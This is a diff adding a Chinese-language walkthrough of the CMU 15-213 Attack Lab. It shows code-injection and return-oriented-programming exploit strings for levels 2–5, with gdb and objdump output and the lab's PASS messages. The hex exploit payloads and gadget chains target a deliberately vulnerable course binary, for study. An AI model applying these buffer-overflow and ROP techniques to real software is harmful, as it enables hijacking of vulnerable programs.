@@ -324,7 +324,529 @@ PASS: Would have posted the following:
 
 ### Level 2
 
+需要注入一小段代码，作为exploit string的一部分
 
+> Within the file `ctarget` there is code for a function `touch2` having the following C representation:
+> ![touch2](https://s2.loli.net/2025/08/17/sX8wJCQLAl53W9c.png)
+>
+> Your task is to get `CTARGET` to execute the code for `touch2` rather than returning to `test`. In this case, however, you must make it appear to `touch2` as if you have passed your cookie as its argument.
+> 
+> Do not attempt to use `jmp` or `call` instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use `ret` instructions for all transfers of control, even when you are not returning from a call.
+
+简单的用中文说，就是通过返回值调用touch2，同时传入参数——我们自己的cookie，限制使用jmp和call
+
+
+首先查询cookie的地址值，touch2的地址值
+```shell
+(gdb) p/x &cookie
+$20 = 0x6044e4
+(gdb) p touch2 
+$21 = {void (unsigned int)} 0x4017ec <touch2>
+```
+
+然后尝试去编写注入代码
+```assembly
+movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi
+pushq   $0x4017ec
+ret
+```
+
+```assembly
+main:
+        movq	$0x59b997fa, %rdi
+        pushq	$0x4017ec
+        ret
+```
+然后编译并objdump
+```shell
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l2.s 
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d injection.l2.o
+
+injection.l2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <main>:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 ec 17 40 00          push   $0x4017ec
+   c:   c3                      ret    
+```
+将dump出的机械码写入答案，也就是getbuf写入函数的顶部,然后40个字节处写下rsp在调用gets时的地址值即可。
+
+```shell
+ 1│ Dump of assembler code for function getbuf:
+ 2│ buf.c:
+ 3│ 12      in buf.c
+ 4│    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
+ 5│
+ 6│ 13      in buf.c
+ 7│ 14      in buf.c
+ 8├──> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
+
+(gdb) x/gx $rsp
+0x5561dc78:     0x0000000000000000
+```
+
+即最终答案为
+```txt
+48 c7 c7 fa 97 b9 59 68 
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+```
+
+```shell
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q -i <(./hex2raw < ctarget.l2.txt)
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+```
+
+### Level 3
+
+改成了传一个字符串参数
+
+> Within the file `ctarget` there is code for functions hexmatch and `touch3` having the following C representations:
+> ![hexmatch](https://s2.loli.net/2025/08/17/BVg468kxKLSZfJI.png)
+> Your task is to get `CTARGET` to execute the code for `touch3` rather than returning to test. You must make it appear to `touch3` as if you have passed a string representation of your cookie as its argument.
+
+避免去查ascii，这里有一个小技巧
+```shell
+man ascii
+```
+
+注意到hex_march这里有一个*s,随机在一个栈的位置取值，根据后面的写法，这里用sprintf完成了从unsigned到string的转变。并且重写了部分栈的区域。
+
+利用test的栈就行，test有8个栈帧的空间，足够用了
+
+查询必要的信息
+```shell
+
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget | grep touch3
+00000000004018fa T touch3
+
+ 1│ Dump of assembler code for function test:
+ 2│ visible.c:
+ 3│ 90      in visible.c
+ 4│    0x0000000000401968 <+0>:     sub    $0x8,%rsp
+ 5│
+ 6│ 91      in visible.c
+ 7│ 92      in visible.c
+ 8├──> 0x000000000040196c <+4>:     mov    $0x0,%eax
+(gdb) x/x $rsp
+0x5561dca8:     0x0000000000000009
+```
+
+这里通过两个rsp的值相减，可以发现相差的rsp值在test与getbuf之间足足有48个栈帧。可见地址实际上由于padding的原因是补齐了4个字节的。
+
+开始构造注入代码
+```assembly
+main:
+	movq	0x5561dca8, %rdi
+	pushq	$0x4018fa
+	ret
+```
+
+然后相同的指令
+```shell
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l3.s 
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d injection.l3.o
+
+injection.l3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <main>:
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   68 fa 18 40 00          push   $0x4018fa
+   c:   c3                      ret  
+```
+
+然后构造exploit string，注意这里的排序，是顺序排的，从低到高。`strcmp`会解决这个字符串没有结尾的问题
+
+```hex
+48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 DC 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+```shell
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q -i <(./hex2raw < ctarget.l3.txt)
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
+```
+
+基本上构造出来就对了
+
+好！所有`ctarget`都做完了，**现在是另一种构造攻击了**
+
+### Level 4
+
+**Part II: Return-Oriented Programming**
+
+这种面向返回的攻击要比代码注入攻击要难的多，CMU介绍其主要具有两种技术点
+
+> -  It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
+> - It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault
+> 
+> 基本是说rtarget的代码采用了课程中提到的两种防范exploit string的方式。randomization的偏移，这使得注入代码不能被定位，此外，它标记了被栈持有的内存段无法被执行。
+> 
+> 
+![sequence of gatget](https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png)
+> 
+> ~~为什么不用金丝雀，用了就很难攻击了~~
+
+通过提取function tailing的机器码构建gatget，在farm中包含了一些函数，这些函数的特殊tailing使得他们很适合这种攻击，从名字可以看出，这是tools' farm。
+
+可以尝试一下编译该文件
+```shell
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c farm.c 
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d farm.o > farm.d
+```
+
+随便看一个函数
+```assembly
+00000000000001c8 <addval_187>:
+ 1c8:	f3 0f 1e fa          	endbr64 
+ 1cc:	55                   	push   %rbp
+ 1cd:	48 89 e5             	mov    %rsp,%rbp
+ 1d0:	89 7d fc             	mov    %edi,-0x4(%rbp)
+ 1d3:	8b 45 fc             	mov    -0x4(%rbp),%eax
+ 1d6:	2d 77 31 c7 3f       	sub    $0x3fc73177,%eax
+ 1db:	5d                   	pop    %rbp
+ 1dc:	c3                   	ret    
+```
+可见相对于下面的rtarget莫名其妙调用了很多东西
+```assembly
+0000000000401a25 <addval_187>:
+  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
+  401a2b:	c3                   	ret    
+```
+
+可见其中存在诸多例如调用rbp寄存器等无效操作，以及多出了一个endbr64等指令
+
+1. `endbr64`: 这是一个防范ROP Attack的指令
+        - 它被插入到每个函数的入口处
+        - CPU 在执行 ret 指令时，如果目标地址指向一条 endbr64 指令，才允许跳转
+        - 如果 ret 跳转到了没有 endbr64 的地方（比如中间的 gadget），CPU 会触发 #CP 异常（Control Protection Fault），终止程序
+2. `-O2`: 普通的编译命令通常不采用优化，因此为了满足标准的汇编程序格式会有许多无效操作，例如上述代码中的rbp
+
+采用O2优化`-O2`以及禁用CET`-fcf-protection=none`后
+```assembly
+0000000000000160 <addval_187>:
+ 164:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
+ 16a:	c3                   	ret    
+ 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+```
+
+` 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)`:这一句只是5字节的填充模板，intel推荐的NOP模板
+
+| 填充字节 | 汇编                                       |
+|------|------------------------------------------|
+| 2    | 66 90→nopw %ax                           |
+| 3    | 0f 1f 00→nopl (%rax)                     |
+| 4    | 0f 1f 40 00→nopl 0x0(%rax)               |
+| 5    | 0f 1f 44 00 00→nopl 0x0(%rax,%rax,1)     |
+| 6    | 66 0f 1f 44 00 00→nopw 0x0(%rax,%rax,1)  |
+
+这样看就和rtarget很近似了
+
+然后看一下Level 4的题面
+
+重复Level 2的操作
+
+`TIPs`: 
+1. 所有gadgets都可以在rtarget中找到，这块区域由start_farm和end_farm划分
+2. 秩序两个工具完成该攻击
+3. 漏洞利用代码应包含小工具地址和数据的组合
+
+recall一下Level 2的汇编
+```assembly
+movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi
+pushq   $0x4017ec
+ret
+```
+
+问题在于，如何把cookie中的立即数传进rdi
+
+![Appendix](https://s2.loli.net/2025/08/18/IZM3zdxjB9u64Hl.png)
+
+应该明确一些rules
+1. 所有数据都被存放在栈中
+2. 仅能通过返回值调用tailing代码
+
+因此，立即数仅能被存放在栈中，并且仅能通过pop放置在寄存器中。
+查表可知pop %rdi为5f。查询可知submitr函数中，有以5f结尾,地址为402b19。
+查询touch2地址为4017ec
+
+直接构造
+```hex
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+19 2b 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+理论上这是正确的，在调用touch2时rdi被赋值为正确的值。但是用到了并非tools `farm` 中的函数，实际运行发生了意料之外的`segment fault`
+
+尝试另一种解法，通过rax作为中间函数,通过`ROP`构造这样的gadget序列
+```assembly
+pop %rax
+mov %rax %rdi
+ret
+```
+
+```hex
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+这个就对了，可以尝试比较这两个输入的执行流
+
+首先查看一下这个PASS的执行流，可见其在执行完cmp`coockie`和edi后jne顺利跳转到visible文件的段中
+```assembly
+21│ visible.c:
+22│    0x0000000000401818 <+44>:    mov    $0x2,%edi
+23│    0x000000000040181d <+49>:    call   0x401dad <validate>
+24│    0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
+```
+该处执行到call后跳转至
+
+```assembly
+│ 48      in visible.c
+38│ 49      in visible.c
+39├──> 0x0000000000401842 <+86>:    mov    $0x0,%edi
+40│    0x0000000000401847 <+91>:    call   0x400e40 <exit@plt>
+```
+
+随后执行到exit结束
+
+然后看一下上面那个错误的执行流,则在比较完edi与rip后直接跳转到了系统库的stdio2.h中
+```
+14│ /usr/include/x86_64-linux-gnu/bits/stdio2.h:
+15│ 105       return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
+16├──> 0x0000000000401804 <+24>:    mov    $0x403208,%esi
+17│    0x0000000000401809 <+29>:    mov    $0x1,%edi
+18│    0x000000000040180e <+34>:    mov    $0x0,%eax
+19│    0x0000000000401813 <+39>:    call   0x400df0 <__printf_chk@plt>
+```
+可见两者在比较完rip,edi中出现了不同，探索更多信息
+
+以下是正常PASS也就是通过rax传参的具体参数
+```shell
+rax            0x59b997fa          1505335290
+rbx            0x7fffffffdce8      140737488346344
+rcx            0xd6                214
+rdx            0x59b997fa          1505335290
+rsi            0x30                48
+rdi            0x59b997fa          1505335290
+rbp            0x7fffffffdba0      0x7fffffffdba0
+rsp            0x7ffffffca330      0x7ffffffca330
+r8             0xa                 10
+r9             0x607890            6322320
+r10            0x77                119
+r11            0x246               582
+r12            0x4                 4
+r13            0x0                 0
+r14            0x0                 0
+r15            0x7ffff7ffd040      140737354125376
+rip            0x401802            0x401802 <touch2+22>
+--Type <RET> for more, q to quit, c to continue without paging-- 
+
+(gdb) x/16gx $rsp
+0x7ffffffca330: 0x00000000004017ec      0xf4f4f4f4f4f4f400
+0x7ffffffca340: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffffca350: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffffca360: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffffca370: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffffca380: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffffca390: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffffca3a0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+```
+
+```shell
+rax            0x1                 1
+rbx            0x7fffffffdce8      140737488346344
+rcx            0xbe                190
+rdx            0x59b997fa          1505335290
+rsi            0x30                48
+rdi            0x59b997fa          1505335290
+rbp            0x7fffffffdba0      0x7fffffffdba0
+rsp            0x7ffffff98da8      0x7ffffff98da8
+r8             0xa                 10
+r9             0x607890            6322320
+r10            0x77                119
+r11            0x246               582
+r12            0x4                 4
+r13            0x0                 0
+r14            0x0                 0
+r15            0x7ffff7ffd040      140737354125376
+rip            0x401802            0x401802 <touch2+22>
+--Type <RET> for more, q to quit, c to continue without paging--
+
+(gdb) x/16gx $rsp
+0x7ffffff98da8: 0x00000000004017ec      0xf4f4f4f4f4f4f400
+0x7ffffff98db8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffff98dc8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffff98dd8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffff98de8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffff98df8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffff98e08: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+0x7ffffff98e18: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
+```
+
+这里推荐一个软件`Beyond Compare`。
+![compare](https://s2.loli.net/2025/08/18/4wK2YdaZDU3Mbvy.png)
+
+可见这里主要是rsp的值相差很多，其次是rax，rcx的值不相同。可以考虑rsp的值为偏移加调用ret数量不同的结果，rax为调用命令导致的cookie存放，但无法解释rcx的变化，考虑display $rcs，重新运行执行PASS，FAILED版本的exploit string。
+
+可见rcx稳定的保持在214与190。考虑查看哪里修改了它
+
+查询到Gets函数中更改了rcx
+```assembly
+ ~│
+ 1│ Dump of assembler code for function getbuf:
+ 2│ buf.c:
+ 3│ 12      in buf.c
+ 4│    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
+ 5│    
+ 6│ 13      in buf.c
+ 7│ 14      in buf.c
+ 8│    0x00000000004017ac <+4>:     mov    %rsp,%rdi
+ 9├──> 0x00000000004017af <+7>:     call   0x401b60 <Gets>
+10│ 
+11│ 15      in buf.c
+12│ 16      in buf.c
+13│    0x00000000004017b4 <+12>:    mov    $0x1,%eax
+14│    0x00000000004017b9 <+17>:    add    $0x28,%rsp
+15│    0x00000000004017bd <+21>:    ret
+16│ End of assembler dump.
+```
+
+从中找出原因超出了目前我的技术水平，从调用栈中`chk`字样只能猜测其对ROP的构造做了检查然后直接触发了SIGSEGV信号。
+
+### Level 5
+
+> You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
+
+***HAHAHA!***,还要再战！简直就是提振精神的。
+
+Level5 要求与Level3 相同，使用cookie字符串指针调用touch3
+
+`Tips`：
+1. 需要八个gadgets
+2. 用到movl
+
+review一下level3的代码
+```assembly
+movq	$0x5561dca8, %rdi
+pushq	$0x4018fa
+ret
+```
+这里可能已经忘记了0x5561dca8是什么，这是cookie存在栈中的地址，而0x4018fa是touch3的地址
+
+> `nm ./rtarget | grep`可以发现touch3的地址是一样的。
+
+应该如何存放cookie？注意这里存放的时候同样要考虑touch3中对栈的随机占用问题。
+
+如果将其放置在栈中，我们将不知道cookie的地址。唯一相关的方式是获取rsp的地址值然后计算好偏移量。
+
+
+
+构造一下相关的汇编代码
+```assembly
+movq %rsp %rax
+movq %rax %rdi
+popq %rax # 取偏移地址
+movl %eax %edi
+movl %ecx %esi
+lea    (%rdi,%rsi,1),%rax
+movq %rax, %rdi
+```
+
+找一找相关的gadget
+
+```assembly
+401aad: movq %rsp %rax # 此时rsp已经弹出一个值
+4019a2: movq %rax %rdi
+        0x48 # 偏移地址
+4079cc: popq %rax # 取偏移地址
+4019dd: movl %eax %edx
+401a70: movl %edx %ecx 
+401a13: movl %ecx %esi
+4019d6: lea  (%rdx,%rsi,1),%rax
+4019a2: movq %rax, %rdi
+        35 39 62 39 39 37 66 61 # Cookie
+
+```
+
+![level5](https://s2.loli.net/2025/08/18/jQvp85anBgSET9R.png)
+
+构造
+```shell
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+ad 1a 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+cc 19 40 00 00 00 00 00 
+48 00 00 00 00 00 00 00 
+dd 19 40 00 00 00 00 00 
+70 1a 40 00 00 00 00 00 
+13 1a 40 00 00 00 00 00 
+d6 19 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+fa 18 40 00 00 00 00 00 
+35 39 62 39 39 37 66 61
+```
+
+***最终***
+
+```shell
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./rtarget -q -i <(./hex2raw < rtarget.l5.txt)
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
+```
+
+ALL OVER
 
 ## REF
 1. https://csapp.cs.cmu.edu/3e/attacklab.pdf
